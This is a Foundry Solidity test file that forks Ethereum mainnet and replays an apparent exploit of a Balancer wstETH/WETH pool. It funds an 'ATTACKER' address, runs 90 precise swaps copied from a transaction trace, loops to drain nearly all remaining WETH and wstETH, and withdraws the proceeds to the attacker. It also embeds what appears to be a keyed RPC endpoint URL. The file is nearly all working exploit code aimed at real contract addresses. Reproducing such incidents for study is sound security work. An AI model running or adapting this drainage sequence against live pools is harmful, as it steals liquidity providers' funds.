// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract BalancerWstEthWethPoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 constant POOL_ID_WSTETH = 0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2;
    address constant wstETH_WETH_BPT = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;
        uint256 expectedIn;
        uint8 indexIn;
        uint8 indexOut;
    }

    function testWstEthWethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

        console.log("INITIAL STATE:");
        console.log("WETH (index 0):", initialBalances[0]);
        console.log("BPT (index 1):", initialBalances[1]);
        console.log("wstETH (index 2):", initialBalances[2]);

        // Fund attacker with BPT tokens
        deal(wstETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(wstETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(wstETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        // Use internal balance to accumulate funds in Vault
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[90] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176332457006284629565, expectedIn: 1201076805421509281395, indexIn: 1, indexOut: 2 });
        swaps[1] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833064265, expectedIn: 764358109853518473498, indexIn: 1, indexOut: 0 });
        swaps[2] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 11763324570062846295, expectedIn: 12010656467295420512, indexIn: 1, indexOut: 2 });
        swaps[3] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099698330643, expectedIn: 7643510086077799864, indexIn: 1, indexOut: 0 });
        swaps[4] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 117633245700628463, expectedIn: 120105448334705898, indexIn: 1, indexOut: 2 });
        swaps[5] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710996983306, expectedIn: 76434391222014551, indexIn: 1, indexOut: 0 });
        swaps[6] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176332457006285, expectedIn: 1201042840693972, indexIn: 1, indexOut: 2 });
        swaps[7] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833, expectedIn: 764337295067158, indexIn: 1, indexOut: 0 });
        swaps[8] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 11763324570063, expectedIn: 12009836562076, indexIn: 1, indexOut: 2 });
        swaps[9] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099699, expectedIn: 7643781996846, indexIn: 1, indexOut: 0 });
        swaps[10] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 117633245700, expectedIn: 119833719798, indexIn: 1, indexOut: 2 });
        swaps[11] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710997, expectedIn: 76700588074, indexIn: 1, indexOut: 0 });
        swaps[12] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176332457, expectedIn: 1195100784, indexIn: 1, indexOut: 2 });
        swaps[13] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 801957110, expectedIn: 770251646, indexIn: 1, indexOut: 0 });
        swaps[14] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 11763325, expectedIn: 11949997, indexIn: 1, indexOut: 2 });
        swaps[15] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571, expectedIn: 7703694, indexIn: 1, indexOut: 0 });
        swaps[16] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 117633, expectedIn: 119501, indexIn: 1, indexOut: 2 });
        swaps[17] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 80196, expectedIn: 77049, indexIn: 1, indexOut: 0 });
        swaps[18] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 1176, expectedIn: 1196, indexIn: 1, indexOut: 2 });
        swaps[19] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 802, expectedIn: 771, indexIn: 1, indexOut: 0 });
        swaps[20] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: wstETH, amount: 12, expectedIn: 12, indexIn: 1, indexOut: 2 });
        swaps[21] = ExactSwapData({ tokenIn: wstETH_WETH_BPT, tokenOut: address(WETH), amount: 8, expectedIn: 8, indexIn: 1, indexOut: 0 });
        swaps[22] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 1176332457006284629565, expectedIn: 1008333333333333333333, indexIn: 2, indexOut: 1 });
        swaps[23] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 801957109969833064265, expectedIn: 686666666666666666667, indexIn: 0, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 11763324570062846295, expectedIn: 10083246945111111111, indexIn: 2, indexOut: 1 });
        swaps[25] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 8019571099698330643, expectedIn: 6866628896296296296, indexIn: 0, indexOut: 1 });
        swaps[26] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 117633245700628463, expectedIn: 100831946217631962, indexIn: 2, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 80195710996983306, expectedIn: 68666016678209876, indexIn: 0, indexOut: 1 });
        swaps[28] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 1176332457006285, expectedIn: 1008318980750341, indexIn: 2, indexOut: 1 });
        swaps[29] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 801957109969833, expectedIn: 686659785432099, indexIn: 0, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 11763324570063, expectedIn: 10083185107162, indexIn: 2, indexOut: 1 });
        swaps[31] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 8019571099699, expectedIn: 6866567074074, indexIn: 0, indexOut: 1 });
        swaps[32] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 117633245700, expectedIn: 100830992093, indexIn: 2, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 80195710997, expectedIn: 68665726543, indexIn: 0, indexOut: 1 });
        swaps[34] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 1176332457, expectedIn: 1008309292, indexIn: 2, indexOut: 1 });
        swaps[35] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 801957110, expectedIn: 686657160, indexIn: 0, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 11763325, expectedIn: 10083091, indexIn: 2, indexOut: 1 });
        swaps[37] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 8019571, expectedIn: 6866570, indexIn: 0, indexOut: 1 });
        swaps[38] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 117633, expectedIn: 100831, indexIn: 2, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 80196, expectedIn: 68666, indexIn: 0, indexOut: 1 });
        swaps[40] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 1176, expectedIn: 1009, indexIn: 2, indexOut: 1 });
        swaps[41] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 802, expectedIn: 687, indexIn: 0, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 12, expectedIn: 11, indexIn: 2, indexOut: 1 });
        swaps[43] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 8, expectedIn: 7, indexIn: 0, indexOut: 1 });
        swaps[44] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 686666666666666666667, expectedIn: 593820610, indexIn: 2, indexOut: 0 });
        swaps[45] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 593820593, expectedIn: 1176332457006284629565, indexIn: 0, indexOut: 2 });
        swaps[46] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 34500909009792959, indexIn: 0, indexOut: 2 });
        swaps[47] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 480000000000, expectedIn: 221639092, indexIn: 2, indexOut: 0 });
        swaps[48] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 221639075, expectedIn: 25626928172, indexIn: 0, indexOut: 2 });
        swaps[49] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 24492173718, indexIn: 0, indexOut: 2 });
        swaps[50] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 340000000000, expectedIn: 74653989, indexIn: 2, indexOut: 0 });
        swaps[51] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 74653972, expectedIn: 25626928172, indexIn: 0, indexOut: 2 });
        swaps[52] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 38000000000, expectedIn: 142678241, indexIn: 2, indexOut: 0 });
        swaps[53] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 142678224, expectedIn: 8793968805, indexIn: 0, indexOut: 2 });
        swaps[54] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 18271758398, indexIn: 0, indexOut: 2 });
        swaps[55] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 27000000000, expectedIn: 37323791, indexIn: 2, indexOut: 0 });
        swaps[56] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 37323774, expectedIn: 6175705982, indexIn: 0, indexOut: 2 });
        swaps[57] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 12989833396, indexIn: 0, indexOut: 2 });
        swaps[58] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 19000000000, expectedIn: 7483, indexIn: 2, indexOut: 0 });
        swaps[59] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 7466, expectedIn: 4298444362, indexIn: 0, indexOut: 2 });
        swaps[60] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 9436861308, indexIn: 0, indexOut: 2 });
        swaps[61] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 14000000000, expectedIn: 70418664, indexIn: 2, indexOut: 0 });
        swaps[62] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 70418647, expectedIn: 3241446426, indexIn: 0, indexOut: 2 });
        swaps[63] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 7100333832, indexIn: 0, indexOut: 2 });
        swaps[64] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 10000000000, expectedIn: 18076923, indexIn: 2, indexOut: 0 });
        swaps[65] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 18076906, expectedIn: 2300867990, indexIn: 0, indexOut: 2 });
        swaps[66] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 5187974123, indexIn: 0, indexOut: 2 });
        swaps[67] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 7000000000, expectedIn: 352834, indexIn: 2, indexOut: 0 });
        swaps[68] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 352817, expectedIn: 1628449028, indexIn: 0, indexOut: 2 });
        swaps[69] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 3791172740, indexIn: 0, indexOut: 2 });
        swaps[70] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 5000000000, expectedIn: 25101608, indexIn: 2, indexOut: 0 });
        swaps[71] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 25101591, expectedIn: 1175925341, indexIn: 0, indexOut: 2 });
        swaps[72] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 2808251434, indexIn: 0, indexOut: 2 });
        swaps[73] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 4000000000, expectedIn: 6324607, indexIn: 2, indexOut: 0 });
        swaps[74] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 6324590, expectedIn: 857031912, indexIn: 0, indexOut: 2 });
        swaps[75] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 2200990337, indexIn: 0, indexOut: 2 });
        swaps[76] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 3000000000, expectedIn: 11833942, indexIn: 2, indexOut: 0 });
        swaps[77] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 11833925, expectedIn: 656831025, indexIn: 0, indexOut: 2 });
        swaps[78] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 1748326734, indexIn: 0, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 2000000000, expectedIn: 1448151, indexIn: 2, indexOut: 0 });
        swaps[80] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 1448134, expectedIn: 479717644, indexIn: 0, indexOut: 2 });
        swaps[81] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 1401764695, indexIn: 0, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: wstETH, tokenOut: address(WETH), amount: 1000000000, expectedIn: 5580844, indexIn: 2, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 5580827, expectedIn: 356455598, indexIn: 0, indexOut: 2 });
        swaps[84] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH, amount: 17, expectedIn: 1151619856, indexIn: 0, indexOut: 2 });
        swaps[85] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 10000000000, expectedIn: 87478886, indexIn: 2, indexOut: 1 });
        swaps[86] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 10000000000000, expectedIn: 141523892659, indexIn: 0, indexOut: 1 });
        swaps[87] = ExactSwapData({ tokenIn: wstETH, tokenOut: wstETH_WETH_BPT, amount: 10000000000000000, expectedIn: 128359205147277, indexIn: 2, indexOut: 1 });
        swaps[88] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 10000000000000000000, expectedIn: 136238774513878100, indexIn: 0, indexOut: 1 });
        swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: wstETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 12103545600526537726, indexIn: 0, indexOut: 1 });

        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_WSTETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256 amountIn) {
                console.log("Swap", i, "SUCCESS - AmountIn:", amountIn);
                successCount++;
            } catch Error(string memory reason) {
                console.log("Swap", i, "FAILED:", reason);
            } catch {
                console.log("Swap", i, "FAILED (no reason)");
            }

            if (i % 5 == 4) {
                (,uint256[] memory currentBal,) = VAULT.getPoolTokens(POOL_ID_WSTETH);
                console.log("After swap", i+1);
                console.log("  WETH:", currentBal[0]);
                console.log("  BPT:", currentBal[1]);
                console.log("  wstETH:", currentBal[2]);
            }
        }

        console.log("Swaps executed:", successCount);
        console.log("Total swaps:", swaps.length);

        // Continue draining the pool until almost empty
        (,uint256[] memory midBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);
        console.log("Pool state before drainage:");
        console.log("  WETH (index 0):", midBalances[0]);
        console.log("  wstETH (index 2):", midBalances[2]);

        uint256 additionalSwaps = 0;

        // Drain remaining WETH
        while (midBalances[0] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

            uint256 wethToDrain = (midBalances[0] * 95) / 100;
            if (wethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_WSTETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(wstETH_WETH_BPT),
                assetOut: IAsset(address(WETH)),
                amount: wethToDrain,
                userData: ""
            });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        // Drain remaining wstETH
        while (midBalances[2] > 1e9) {
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

            uint256 wstethToDrain = (midBalances[2] * 95) / 100;
            if (wstethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_WSTETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(wstETH_WETH_BPT),
                assetOut: IAsset(wstETH),
                amount: wstethToDrain,
                userData: ""
            });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break;
        }

        console.log("Additional drainage swaps:", additionalSwaps);

        // WITHDRAWAL VIA manageUserBalance()
        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(address(WETH));
        internalTokens[1] = IERC20(wstETH_WETH_BPT);
        internalTokens[2] = IERC20(wstETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Vault internal balances BEFORE withdrawal:");
        console.log("  Internal WETH:", internalBalances[0] / 1e18, "ETH");
        console.log("  Internal BPT:", internalBalances[1] / 1e18, "ETH");
        console.log("  Internal wstETH:", internalBalances[2] / 1e18, "ETH");

        console.log("Attacker wallet balances BEFORE:");
        console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("  BPT:", IERC20(wstETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("  wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(address(WETH)),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[1] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(wstETH_WETH_BPT),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
                opIndex++;
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(wstETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("manageUserBalance executed!");
            console.log("Operations executed:", opsCount);

            console.log("Attacker wallet balances AFTER:");
            console.log("  WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
            console.log("  BPT:", IERC20(wstETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
            console.log("  wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");

            uint256[] memory internalBalancesAfter = VAULT.getInternalBalance(ATTACKER, internalTokens);
            console.log("Vault internal balances AFTER:");
            console.log("  Internal WETH:", internalBalancesAfter[0], "wei");
            console.log("  Internal BPT:", internalBalancesAfter[1], "wei");
            console.log("  Internal wstETH:", internalBalancesAfter[2], "wei");

            console.log("WETH withdrawn:", internalBalances[0] / 1e18, "ETH");
            console.log("BPT withdrawn:", internalBalances[1] / 1e18, "ETH");
            console.log("wstETH withdrawn:", internalBalances[2] / 1e18, "ETH");

            console.log("Total value:", (internalBalances[0] + internalBalances[2]) / 1e18, "ETH");
        } else {
            console.log("No internal balances to withdraw");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_WSTETH);

        console.log("FINAL STATE:");
        console.log("WETH (index 0):", finalBalances[0]);
        console.log("BPT (index 1):", finalBalances[1]);
        console.log("wstETH (index 2):", finalBalances[2]);

        console.log("POOL DELTAS:");
        console.log("WETH delta:");
        console.logInt(int256(finalBalances[0]) - int256(initialBalances[0]));
        console.log("BPT delta:");
        console.logInt(int256(finalBalances[1]) - int256(initialBalances[1]));
        console.log("wstETH delta:");
        console.logInt(int256(finalBalances[2]) - int256(initialBalances[2]));

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(wstETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps:", successCount + additionalSwaps);
        console.log("SUCCESS!");
    }
    
}
